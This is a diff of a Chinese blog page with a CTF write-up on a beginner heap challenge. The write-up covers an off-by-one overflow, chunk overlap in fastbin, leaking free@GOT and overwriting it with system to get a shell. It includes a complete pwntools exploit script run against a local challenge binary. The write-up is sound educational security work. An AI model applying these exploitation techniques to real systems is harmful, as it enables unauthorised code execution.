@@ -35,12 +35,12 @@
 
   
   
-    <meta name="description" content="之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。 程序分析checksec查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。  程序逻辑题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜">
+    <meta name="description" content="之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。 程序分析checksec查看开启的保护信息：部分 RELRO、canary 以及堆栈不可执行。  程序逻辑题目给出了 libc 文件，所以先用 pwninit 以及 patchelf 对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记一道pwn入门堆题 off-by-one">
 <meta property="og:url" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/index.html">
 <meta property="og:site_name" content="淋着雨">
-<meta property="og:description" content="之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。 程序分析checksec查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。  程序逻辑题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜">
+<meta property="og:description" content="之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。 程序分析checksec查看开启的保护信息：部分 RELRO、canary 以及堆栈不可执行。  程序逻辑题目给出了 libc 文件，所以先用 pwninit 以及 patchelf 对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image1.png">
 <meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image2.png">
@@ -51,7 +51,7 @@
 <meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image7.png">
 <meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image8.png">
 <meta property="article:published_time" content="2026-06-11T06:02:43.000Z">
-<meta property="article:modified_time" content="2026-06-14T07:02:39.059Z">
+<meta property="article:modified_time" content="2026-07-19T09:51:46.659Z">
 <meta property="article:author" content="淋着雨">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="heap">
@@ -319,7 +319,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-06-11T06:02:43.000Z" itemprop="datePublished">2026-06-11</time>
-    <time style="display: none;" id="post-update-time">2026-06-14</time>
+    <time style="display: none;" id="post-update-time">2026-07-19</time>
   </span>
   
 </div>
@@ -339,26 +339,26 @@
       
       
         <p>之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。</p>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>查看开启的保护信息：部分 RELRO、canary 以及堆栈不可执行。</p>
 <p><img src="image1.png" alt="checksec"></p>
-<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜单题，提供增删改查操作。</p>
+<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>题目给出了 libc 文件，所以先用 pwninit 以及 patchelf 对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜单题，提供增删改查操作。</p>
 <p><img src="image2.png" alt="运行程序"></p>
-<h3 id="ida伪代码分析"><a href="#ida伪代码分析" class="headerlink" title="ida伪代码分析"></a>ida伪代码分析</h3><p>main函数负责调用菜单函数以及各个操作函数，跟进操作函数进行分析。其中引起注意的是create_heap函数以及edit_heap函数。</p>
-<p>cerate_heap ：维护一个heaparray数组，申请堆块时遍历数组找到第一个为空的位置；每次申请堆块时都会固定先申请一个0x20大小的堆块作为“管理块”，接着再申请用户所申请大小的堆块作为“数据块”。其中，“v0&#x3D; (__int64)<em>(&amp;heaparray + n9)”将“管理块”地址转为整数赋给v0；“</em>(QWORD <em>)(v0 + 8) &#x3D; malloc(size)”将管理块偏移量为8的地址用来存放“数据块”的数据指针；“</em>(QWORD <em>)</em>(&amp;heaparray + n9) &#x3D; size”将“管理块”起始的8字节用来存放“数据块”的size。</p>
+<h3 id="ida伪代码分析"><a href="#ida伪代码分析" class="headerlink" title="ida伪代码分析"></a>ida伪代码分析</h3><p>main 函数负责调用菜单函数以及各个操作函数，跟进操作函数进行分析。其中引起注意的是 create_heap 函数以及 edit_heap 函数。</p>
+<p>cerate_heap ：维护一个 heaparray 数组，申请堆块时遍历数组找到第一个为空的位置；每次申请堆块时都会固定先申请一个 0x20 大小的堆块作为“管理块”，接着再申请用户所申请大小的堆块作为“数据块”。其中，<code>v0= (__int64)*(&amp;heaparray + n9)</code>将“管理块”地址转为整数赋给 v0；<code>*(QWORD *)(v0 + 8) = malloc(size)</code>将管理块偏移量为 8 的地址用来存放“数据块”的数据指针；<code>*(QWORD *)*(&amp;heaparray + n9) = size</code>将“管理块”起始的 8 字节用来存放“数据块”的 size。</p>
 <p><img src="image3.png" alt="create_heap"></p>
-<p>例如申请一个0x10大小的堆块：</p>
+<p>例如申请一个 0x10 大小的堆块：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> --------------------------------------</span><br><span class="line">|    pre_size   |        0x10          |      &lt;---管理块</span><br><span class="line"> --------------------------------------</span><br><span class="line">|   data_size   | *data(指向user_data) |</span><br><span class="line"> --------------------------------------</span><br><span class="line">|   pre_size    |        0x10          |      &lt;---数据块</span><br><span class="line"> --------------------------------------</span><br><span class="line">|              user_data               | </span><br><span class="line"> --------------------------------------</span><br></pre></td></tr></table></figure>
 
-<p>在edit_heap函数中注意到“read_input(*((_QWORD <em>)</em>(&amp;heaparray + n0xA) + 1), *(_QWORD <em>)</em>(&amp;heaparray + n0xA) + 1LL)”，正常向堆块中写入内容的大小应该是size，而这里多出了“1LL”，典型的off-by-one，利用这个我们就能够通过溢出的字节修改下一个相邻堆块的大小。</p>
+<p>在 edit_heap 函数中注意到<code>read_input(*((_QWORD *)*(&amp;heaparray + n0xA) + 1), *(_QWORD *)*(&amp;heaparray + n0xA) + 1LL)</code>，正常向堆块中写入内容的大小应该是 size，而这里多出了“1LL”，典型的<code>off-by-one</code>，利用这个我们就能够通过溢出的字节修改下一个相邻堆块的大小。</p>
 <p><img src="image4.png" alt="edit_heap"></p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>申请一个0x38大小的chunk0以及0x10大小的chunk1，注意此处申请的chunk0大小必须是“0xX8”，如果申请的是“0xX0”大小的话溢出修改到的就不是下一个相邻chunk的size而是pre_size了；往chunk0中写入以“&#x2F;bin&#x2F;sh\x00”开头的38字节内容加上“\x41”。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>申请一个 0x38 大小的 chunk0 以及 0x10 大小的 chunk1，注意此处申请的 chunk0 大小必须是<code>0xX8</code>，如果申请的是<code>0xX0</code>大小的话溢出修改到的就不是下一个相邻 chunk 的 size 而是 pre_size 了；往 chunk0 中写入以“&#x2F;bin&#x2F;sh\x00”开头的 38 字节内容最后加上“\x41”。</p>
 <p><img src="image5.png" alt="溢出"></p>
-<p>通过gdb调试，可以看到此时chunk1的“管理块”大小已经被修改为了0x41，而“数据块”被“包含”在了我们所伪造的“管理块”中。</p>
+<p>通过 gdb 调试，可以看到此时 chunk1 的“管理块”大小已经被修改为了 0x41，而“数据块”被“包含”在了我们所伪造的“管理块”中。</p>
 <p><img src="image6.png" alt="调试1"></p>
-<p>接下来我们释放掉chunk1，伪造的“管理块”以及原来的“数据块”都一同被放进了fastbin中。此时我们申请一个0x30大小的chunk，glibc会先从fastbin中取出原来chunk1的“数据块”作为新的chunk1的“管理块”，再从fastbin中取出伪造的0x41的“管理块”作为新的chunk1的“数据块”；申请的时候往chunk中偏移刚好为数据指针的地址写入free@GOT，借助show_heap函数将free@GOT打印出来，用来计算libc基址，这就和之前的ret2libc很像了。</p>
+<p>接下来我们释放掉 chunk1，伪造的“管理块”以及原来的“数据块”都一同被放进了 fastbin 中。此时我们申请一个 0x30 大小的 chunk，glibc 会先从 fastbin 中取出原来 chunk1 的“数据块”作为新的 chunk1 的“管理块”，再从 fastbin 中取出伪造的 0x41 的“管理块”作为新的 chunk1 的“数据块”；申请的时候往 chunk 中偏移刚好为数据指针的地址写入 free@GOT，借助show_heap 函数将 free@GOT 打印出来，用来计算 libc 基址，这就和之前的 ret2libc 很像了。</p>
 <p><img src="image7.png" alt="二次申请"></p>
 <p><img src="image8.png" alt="调试2"></p>
-<p>glibc通过“管理块”查找数据指针指向的地址，向该地址写入内容，所以当往里面写入system函数地址时，free@GOT上存放的就变成了system函数地址而不是free函数地址，实现了“调包”，接着释放chunk0时就相当于执行“system(“&#x2F;bin&#x2F;sh\x00”)”实现getshell了。</p>
+<p>glibc 通过“管理块”查找数据指针指向的地址，向该地址写入内容，所以当往里面写入 system 函数地址时，free@GOT 上存放的就变成了 system 函数地址而不是 free 函数地址，实现了“调包”，接着释放 chunk0 时就相当于执行<code>system(&quot;/bin/sh\x00&quot;)</code>实现 getshell了。</p>
 <h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;&quot;, )</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment"># chunk1</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">b&#x27;\x41&#x27;</span>  <span class="comment"># 修改chunk1大小</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(free_got)  <span class="comment"># 写入free@GOT指针</span></span><br><span class="line">create(<span class="number">0x30</span>, payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment"># 接收free函数地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)  # 调试</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
@@ -403,7 +403,7 @@
       
         
         
-          <img data-src="/covers/【哲风壁纸】CG插画-CG美女插画.png" data-sizes="auto" alt="Earth靶机渗透" class="lazyload">
+          <img data-src="/covers/【哲风壁纸】圣杯战争-日本动漫.png" data-sizes="auto" alt="Earth靶机渗透" class="lazyload">
         
       
       <a href="/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"></a>
@@ -482,7 +482,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        7.4k
+        7.3k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         00:27
@@ -668,9 +668,9 @@
           url: "http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/",
           excerpt: "",
           description: "",
-          stripContent: "之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。 程序分析checksec查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。  程序逻辑题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜单题，提供增删改查操作。  ida伪代码分析main函数负责调用菜单函数以及各个操作函数，跟进操作函",
+          stripContent: "之前开始学堆时碰到的新手题对我来说还是太难了，一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，记录一下。 程序分析checksec查看开启的保护信息：部分 RELRO、canary 以及堆栈不可执行。  程序逻辑题目给出了 libc 文件，所以先用 pwninit 以及 patchelf 对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜单题，提供增删改查操作。  ida伪代码分析main 函数负责调用菜单函数以及各个操",
           date: "Thu Jun 11 2026 14:02:43 GMT+0800",
-          updated: "Sun Jun 14 2026 15:02:39 GMT+0800",
+          updated: "Sun Jul 19 2026 17:51:46 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
@@ -830,7 +830,7 @@
               envId: '',
               region: '',
               urls: [
-                '/2026/07/19/%E8%AE%B0SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/'
+                '/friend/index.html'
               ],
               includeReply: false
             }).then((res) => {
